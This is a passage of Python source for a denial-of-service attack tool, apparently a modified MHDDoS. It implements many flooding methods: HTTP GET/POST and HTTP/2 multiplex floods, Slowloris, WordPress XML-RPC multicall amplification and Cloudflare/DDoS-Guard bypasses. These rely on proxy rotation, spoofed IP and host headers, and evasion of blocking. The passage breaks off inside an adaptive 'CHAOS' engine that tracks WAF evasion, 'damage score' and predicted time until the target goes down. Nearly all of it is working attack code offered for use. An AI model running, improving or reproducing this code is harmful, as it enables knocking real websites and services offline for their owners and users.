             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self) -> None:
        # [OPTIMIZED] Parsed Packet Storm (Dynamic)
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = self.generate_payload()
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        Tools.safe_close(s)

    def KILLER(self) -> None:
        # [FIX] Semaphore to prevent fork bomb (max 500 concurrent sub-threads)
        sem = __import__('threading').Semaphore(500)
        while self._synevent.is_set():
            sem.acquire()
            def _fire():
                try:
                    self.GET()
                finally:
                    sem.release()
            Thread(target=_fire, daemon=True).start()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            if Tools.send(s, p1):
                REQUESTS_SENT += 1
                BYTES_SEND += len(p1)
            if Tools.send(s, p2):
                REQUESTS_SENT += 1
                BYTES_SEND += len(p2)
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                REQUESTS_SENT += 1
                BYTES_SEND += len(payload)
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                # [OPTIMIZED] Dynamic Path
                path = self.get_random_target_path()
                full_url = f"{self._target.scheme}://{self._target.authority}{path}"
                
                if pro:
                    with s.get(full_url,
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(full_url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120: break
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                            continue

                Tools.safe_close(ss)

            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

            Tools.safe_close(ss)

    def DYN(self):
        # [OPTIMIZED] Dynamic Host + Dynamic Path
        path = self.get_random_target_path()
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        
        request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
        # [PHASE 15] DYN Host Logic: Disable random subdomains if Host Spoofing is active
        # Origin IPs usually don't support wildcard virtual hosts.
        if hasattr(self, '_raw_target') and self._raw_target[0] != self._target.host:
             host_header = f"Host: {self._target.authority}\r\n"
        else:
             host_header = f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
        
        payload: Any = (f"{request_line}"
                        f"{host_header}"
                        f"User-Agent: {ua}\r\n"
                        f"{headers}"
                        "\r\n").encode("utf-8")
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    if int(REQUESTS_SENT) < 50:
                        print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
                    # [FIX] Non-blocking status check using select instead of recv
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    BURNED_PROXIES[self._current_proxy] = time()
                                    raise Exception("Proxy Blocked")
                        except (BlockingIOError, ssl.SSLWantReadError):
                            pass
                        except Exception as e:
                            if "Blocked" in str(e): raise e
        except Exception as e:
            pass
        Tools.safe_close(s)

    def POST_DYN(self):
        # [PHASE 2] Non-Cacheable POST Flood
        path = self.get_random_target_path()
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        
        # Build realistic JSON Payload
        json_data = f'{{"form_id": "{ProxyTools.Random.rand_str(8)}", "utm_source": "google", "data": "{ProxyTools.Random.rand_str(randint(200, 400))}"}}'
        
        # [PHASE 4] Referer Spoofing
        ref = randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers)
        
        payload = (f"POST {path} HTTP/1.1\r\n"
                   f"Host: {self._target.authority}\r\n"
                   f"User-Agent: {ua}\r\n"
                   f"{headers}"
                   f"Referer: {ref}\r\n"
                   f"Content-Type: application/json\r\n"
                   f"Origin: {self._target.scheme}://{self._target.authority}\r\n"
                   f"Content-Length: {len(json_data)}\r\n\r\n"
                   f"{json_data}").encode("utf-8")
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT, BURNED_PROXIES, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    if int(REQUESTS_SENT) < 50:
                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Packet Sent")
                    # [FIX] Non-blocking status check using select
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    BURNED_PROXIES[self._current_proxy] = time()
                                    raise Exception("Proxy Blocked")
                        except (BlockingIOError, ssl.SSLWantReadError):
                            pass
                        except Exception as e:
                            if "Blocked" in str(e): raise e
        except:
            pass
        Tools.safe_close(s)

    def H2_FLOOD(self):
        # [PHASE 5 & 10] HTTP/2 Multiplexing Flood (Optimized Client)
        global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND, TOTAL_REQUESTS_SENT, RECYCLE_EVENT, IS_RECYCLING
        
        path = self.get_random_target_path()
        ua = randchoice(self._useragents)
        
        # Map raw proxy to httpx format
        proxy_url = None
        if self._proxies:
            # [PHASE 13] Use randchoice for shared pool sync
            for _ in range(20): # Increased attempts
                p = randchoice(self._proxies)
                p_str = str(p)
                burn_time = BURNED_PROXIES.get(p_str)
                if not burn_time or (time() - burn_time >= COOLING_PERIOD):
                    # [FIX] PyRoxy str(p) often includes prefix already. Avoid double prefix.
                    if "://" in p_str:
                        proxy_url = p_str
                    else:
                        prefix = "socks5://" if p.type in {ProxyType.SOCKS5, ProxyType.SOCKS4} else "http://"
                        proxy_url = f"{prefix}{p_str}"
                    
                    self._current_proxy = p_str 
                    break
            else:
                # [PHASE 13] Trigger recycle if all proxies are burned
                if not IS_RECYCLING:
                    RECYCLE_EVENT.set()
                sleep(2)
                return 

        # [PHASE 13] Correct URL Construction for Spoofing & httpx Compatibility
        target_domain = self._target.user or self._target.host
        
        # [FIX] Sanitize path to avoid double slashes (common in crawled links)
        safe_path = path if path.startswith("/") else f"/{path}"
        if safe_path.startswith("//"): 
            safe_path = "/" + safe_path.lstrip("/")

        clean_target_url = f"{self._target.scheme}://{self._target.host}{safe_path}"

        headers = {
            "User-Agent": ua,
            "Accept-Encoding": "gzip, deflate, br",
            "X-Forwarded-For": Tools.get_random_indo_ip(),
            "Referer": randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers),
            "Host": target_domain # Ensure Host header is correct even if hitting origin IP
        }

        try:
            # [PHASE 10] Reuse client if possible to prevent overhead
            client = getattr(self, '_h2_client', None)
            if client is None or client.is_closed:
                # [DEBUG] Optional: print(f"[DEBUG] H2 Thread {self._thread_id} connecting to {clean_target_url} via {proxy_url}")
                self._h2_client = httpx.Client(
                    http2=True,
                    verify=False,
                    proxy=proxy_url,
                    headers=headers,
                    timeout=5.0 # Increased timeout for slow proxies
                )
                client = self._h2_client
            # [PHASE 15] High-Intensity Multiplexing (50 concurrent streams per connection)
            for _ in range(50): 
                # [PHASE 15] SNI Fix for Host Spoofing: Ensure SSL handshake uses domain, not IP
                with client.stream("GET", clean_target_url, extensions={"sni_hostname": target_domain}) as resp:
                    CONNECTIONS_SENT += 1
                    REQUESTS_SENT += 1
                    TOTAL_REQUESTS_SENT += 1
                    # Track data sent/received
                    BYTES_SEND += 1000 # Approx headers + partial body
                    
                    if resp.status_code % 100 == 5:
                        print(f"[{int(CONNECTIONS_SENT)}] [STATUS {resp.status_code}] H2_FLOOD: Target Overloaded!")
                    elif resp.status_code in {403, 429}:
                        if proxy_url:
                            BURNED_PROXIES[p_str] = time()
                        raise Exception("Proxy Blocked")
                
                # [PHASE 13] Check if recycle target reached
                if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
                    if not IS_RECYCLING:
                        RECYCLE_EVENT.set()
        except Exception as e:
            # [PHASE 15] Aggressive Silent Mode for common proxy noise
            noisy_errors = {"timed out", "handshake", "read operation", "Server disconnected", "Malformed reply", "EOF occurred"}
            err_msg = str(e)
            is_noisy = any(ne.lower() in err_msg.lower() for ne in noisy_errors)

            # [DEBUG] Only show initial errors or non-noisy core failures
            if int(REQUESTS_SENT) < 50 or (not is_noisy and int(REQUESTS_SENT) < 200):
                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] H2_FLOOD: {err_msg[:60]}...")
            
            # [PHASE 14] Client Persistence: Only kill on core protocol/auth failures
            critical_failures = {"NoneType", "protocol error", "socks", "proxy blocked"}
            is_critical = any(cf.lower() in err_msg.lower() for cf in critical_failures)

            if is_critical:
                if getattr(self, '_h2_client', None) is not None:
                    try: self._h2_client.close()
                    except: pass
                    self._h2_client = None

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
                while 1:
                    sleep(.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b'0')
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % self._target.authority +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        Tools.safe_close(s)

    def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             
                             'Cache-Control: max-age=0\r\n'
                             'Connection: keep-alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self):
        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
               
               'Cache-Control: max-age=0\r\n'
               'Connection: keep-alive\r\n'
               'Sec-Fetch-Dest: document\r\n'
               'Sec-Fetch-Mode: navigate\r\n'
               'Sec-Fetch-Site: none\r\n'
               'Sec-Fetch-User: ?1\r\n'
               'Sec-Gpc: 1\r\n'
               'Pragma: no-cache\r\n'
               'Upgrade-Insecure-Requests: 1\r\n\r\n')
        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                       self._target.authority,
                                                       hexh) +
                            "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                            self.randHeadercontent + dep), str.encode(
            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
                                                          self._target.authority) +
            "Host: %s\r\n" % hexh +
            self.randHeadercontent + dep)
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            if Tools.send(s, p1):
                REQUESTS_SENT += 1
                BYTES_SEND += len(p1)
            for _ in range(self._rpc):
                if Tools.send(s, p2):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(p2)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(self._payload +
                                  f"Host: {self._target.authority}\r\n" +
                                  "User-Agent: null\r\n" +
                                  "Referrer: null\r\n" +
                                  self.SpoofIP + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self):
        assert self._proxies, \
            'This method requires proxies. ' \
            'Without proxies you can use github.com/codesenberg/bombardier'

        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break

        res = run(
            [
                f'{bombardier_path}',
                f'--connections={self._rpc}',
                '--http2',
                '--method=GET',
                '--latencies',
                '--timeout=30s',
                f'--requests={self._rpc}',
                f'--proxy={proxy}',
                f'{self._target.human_repr()}',
            ],
            stdout=PIPE,
        )
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep='\n')

    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        try:
            s = self.open_connection()
            # Increment Global Counter for visual feedback
            # Increment Global Counter for visual feedback
            global REQUESTS_SENT, TOTAL_REQUESTS_SENT, CONNECTIONS_SENT
            REQUESTS_SENT += 1
            TOTAL_REQUESTS_SENT += 1
            CONNECTIONS_SENT += 1
            if int(REQUESTS_SENT) < 50:
                print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
            for _ in range(self._rpc):
                Tools.send(s, payload)
            
            while True:
                # Keep sending full payloads or keep-alives?
                # Original logic was weird. Let's just send keep-alive headers to existing connection
                if Tools.send(s, payload):
                     # print("[DEBUG] SLOW: Packet Sent")
                     pass
                
                # Check for response?
                # if s.recv(1): ... this blocks.
                
                for i in range(self._rpc):
                    # [NEW] Indonesian ISP Randomized Junk Header
                    junk_key = randchoice(["X-ISP", "X-Sponsor", "X-Route", "X-Provider"])
                    junk_val = randchoice(["Telkomsel", "Indihome", "XL-Axiata", "Biznet", "FirstMedia"])
                    Tools.send(s, (f"{junk_key}: {junk_val}\r\n").encode("utf-8"))
                    
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        except Exception as e:
            err = str(e)
            if "timed out" in err or "Timeout" in err:
                # print(f"[DEBUG] SLOW: Connection Held (Timeout) - Good Sign")
                pass
            elif "[Errno 111]" in err or "Connection refused" in err:
                pass # Suppress Proxy Refused errors
            elif "[Errno 104]" in err or "Reset by peer" in err:
                pass # Suppress Connection Reset errors
            elif "Broken pipe" in err:
                pass # Suppress Broken Pipe
            else:
                # print(f"[DEBUG] SLOW Error: {e}") # Suppress unknown errors too to stay clean
                pass
        Tools.safe_close(s)

    def SLOW_V2(self):
        # [OPTIMIZED] Authentic Slowloris (Partial Headers)
        # Based on gkbrk/slowloris: Send headers but NEVER finish the request.
        # Ideally keeps the socket open forever.
        
        # 1. Partial Payload (No double \r\n at end)
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        path = self.get_random_target_path()
        
        partial_payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"{headers}"
                           f"Connection: keep-alive\r\n"
                           f"Keep-Alive: {randint(300, 1000)}\r\n"
                           f"Cache-Control: max-age=0\r\n").encode("utf-8")

        s = None
        with suppress(Exception), self.open_connection() as s:
            # Send the partial header
            Tools.send(s, partial_payload)
            
            # Keep-Alive Loop
            for _ in range(self._rpc): # Use RPC as duration multiplier
                # Wait before sending next header tick (Low & Slow)
                sleep(randint(5, 15)) 
                
                try:
                    # Send random header to keep connection alive
                    # But STILL don't close the request body
                    keep = f"X-a: {randint(1, 5000)}\r\n".encode("utf-8")
                    if Tools.send(s, keep):
                        # Success tick
                        pass
                    else:
                        break # Socket died
                except:
                    break
        
        Tools.safe_close(s)

    def WP_SEARCH(self):
        # [UPGRADED] WP DB Stresser with Blacklist & Monitor
        sep = "&" if "?" in self._target.raw_path_qs else "?"
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1
            
            for _ in range(self._rpc):
                search_query = ProxyTools.Random.rand_str(randint(5, 15))
                full_path = f"{self._target.raw_path_qs}{sep}s={search_query}"
                ua = randchoice(self._useragents)
                headers = self.build_consistent_headers(ua)
                
                payload = (f"GET {full_path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"{headers}"
                           f"Connection: keep-alive\r\n"
                           f"\r\n").encode("utf-8")
                
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    
                    # Status Sniffer for Blacklist
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                            status_code = response_start.split(" ")[1]
                            if status_code in {"403", "429"}:
                                if hasattr(self, '_current_proxy'):
                                    BURNED_PROXIES[self._current_proxy] = time()
                                raise Exception("Proxy Blocked")
                    except Exception as e:
                        if "Blocked" in str(e): raise e
                        pass
        except:
            pass
        Tools.safe_close(s)

    def XMLRPC_AMP(self):
        # [OPTIMIZED] XML-RPC Amplification (CPU Killer)
        # Abuses system.multicall to execute hundreds of methods in one request.
        
        # Build Amplification Vector (100x calls)
        calls = ""
        for _ in range(100):
            calls += "<value><struct><member><name>methodName</name><value><string>system.listMethods</string></value></member></struct></value>"
            
        xml_payload = (f"<?xml version='1.0' encoding='iso-8859-1'?>"
                       f"<methodCall><methodName>system.multicall</methodName>"
                       f"<params><param><value><array><data>{calls}</data></array></value></param></params>"
                       f"</methodCall>")
        
        # XMLRPC usually lives at /xmlrpc.php
        target_path = self._target.raw_path_qs
        if "xmlrpc" not in target_path:
             target_path = "/xmlrpc.php"

        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)

        post_payload = (f"POST {target_path} HTTP/1.1\r\n"
                        f"Host: {self._target.authority}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"{headers}"
                        f"Content-Type: application/xml\r\n"
                        f"Content-Length: {len(xml_payload)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Accept: */*\r\n"
                        f"\r\n"
                        f"{xml_payload}").encode("utf-8")
        
        s = None
        # Use try-except to catch connection issues
        try:
            s = self.open_connection()
            # Increment Global Counter
            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1
            
            for _ in range(self._rpc):
                if Tools.send(s, post_payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(post_payload)
                    if int(REQUESTS_SENT) < 50:
                        print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Packet Sent to {self._target.authority}")
                    # Simple sniffer
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    if hasattr(self, '_current_proxy'):
                                        BURNED_PROXIES[self._current_proxy] = time()
                                    break
                        except Exception as e:
                            pass
        except:
            pass
        Tools.safe_close(s)


    # ========================================================================
    #  CHAOS V12 - DEEP TACTICAL AI ENGINE
    #  Phase 1: DEEP RECON     -> Multi-probe target fingerprinting
    #  Phase 2: STRATEGIC PLAN -> WAF/CMS/Server-aware weighted strategy
    #  Phase 3: EXECUTE        -> Precision vector selection with burst control
    #  Phase 4: OBSERVE        -> Response time + status code analysis
    #  Phase 5: ADAPT          -> Reinforcement learning with decay + momentum
    # ========================================================================
    
    # Class-level persistent memory (shared across all thread instances)
    _chaos_intel = {
        "recon_done": False,
        "waf_type": None,         # cloudflare, akamai, imperva, sucuri, wordfence, modsec, fastly, ddosguard, none
        "server_type": None,      # nginx, apache, litespeed, iis, unknown
        "cms_type": None,         # wordpress, joomla, drupal, shopify, laravel, custom
        "has_captcha": False,
        "has_rate_limit": False,
        "response_time_ms": 0,    # Initial probe response time
        "target_alive": True,     # False when target stops responding (5xx)
        "consecutive_5xx": 0,     # Track server overload signals
        "consecutive_block": 0,   # Track consecutive 403/429 blocks
        "success_history": {},    # method_name -> [recent_results] (sliding window)
        "total_executions": 0,    # Total CHAOS calls for phase transitions
        "phase": "PROBE",         # PROBE -> CALIBRATE -> ASSAULT -> SUSTAIN -> FINISH
        "best_method": None,      # Dynamically tracked top performer
        "worst_method": None,     # Dynamically tracked worst performer
        "endpoints_discovered": [],  # Heavy endpoints found during multi-probe
        "burst_counter": 0,       # For burst/pause rhythm
        "last_method": None,      # Previous method for anti-pattern
        "last_3_methods": [],     # Sliding window of last 3 methods (anti-fingerprint)
        "combo_queue": [],        # Pre-planned combo attack sequence
        "emergency_evasion": False,  # Triggered when WAF is actively hunting us
        "target_weakpoint": None,   # Discovered weak method that causes most damage
        "efficiency_score": {},    # method -> (successes / total_attempts) ratio
        "attack_start_time": 0,    # When the attack started (for time-based phases)
        "last_health_check": 0,    # Timestamp of last target health pulse
        "health_history": [],      # Response time trend [ms, ms, ms...]
        "target_getting_weaker": False,  # True when response times are increasing
        "target_is_down": False,   # True when target stops responding
        "waf_adapting": False,     # True when WAF seems to be learning our pattern
        "blocks_per_minute": [],   # Track block rate over time windows
        "last_block_window_time": 0,
        "decoy_interval": 0,       # Counter for decoy traffic injection
        "methods_tried_count": {},  # Total attempts per method for exploration score
        "exploration_bonus": True,  # Allow exploration of untried methods early on
        "temperature": 0.3,        # Aggression temperature (0.0=stealth, 1.0=full rage)
        "wave_state": "RISE",      # RISE -> PEAK -> FALL -> REST (wave attack pattern)
        "wave_tick": 0,            # Counter for wave timing
        "path_method_scores": {},  # endpoint_path -> {method: score}  (path-method affinity)
        "saved_to_disk": False,    # Whether intel has been persisted
        "session_journey": [],     # Simulated user navigation path stack
        "referer_chain": [],       # Realistic referer header chain
        "cached_paths": [],        # Paths that returned cache-hit (useless to attack)
        "uncached_paths": [],      # Paths that bypass cache (valuable targets)
        "content_type_rotation": 0, # Rotate POST content types
        "harvested_cookies": {},   # Cookies collected from target responses
        "waf_block_signatures": [],# Detected WAF block page keywords
        "waf_rules_triggered": [], # Specific WAF rules we are triggering
        "adaptive_rpc": 10,        # Dynamic requests-per-connection (auto-tuned)
        "jitter_ms": 0,            # Current timing jitter between requests
        "successful_streak": 0,    # Consecutive successful requests
        "method_timing": {},       # method -> avg execution time in ms
        "damage_score": 0,         # Estimated total damage dealt to target
        "generation": 0,           # Genetic algorithm generation counter
        "gene_pool": [],           # Top-performing weight sets (DNA)
        "current_dna": None,       # Active weight set being tested
        "dna_score": 0,            # Fitness score for current DNA
        "rate_limit_threshold": None, # Discovered requests/sec limit
        "rate_limit_probed": False,
        "multi_path_queue": [],    # Queue of (path, method) pairs for multi-targeting
        "encoding_rotation": 0,    # Payload encoding variant counter
        "path_scores": {},         # path -> success_rate for path targeting
        "kill_chain_phase": "RECON",  # RECON->PROBE->WEAKEN->BREACH->OVERWHELM->SUSTAIN_KILL
        "kill_chain_objective": "",    # Current phase objective description
        "predicted_ttd": None,        # Time-To-Down prediction in seconds
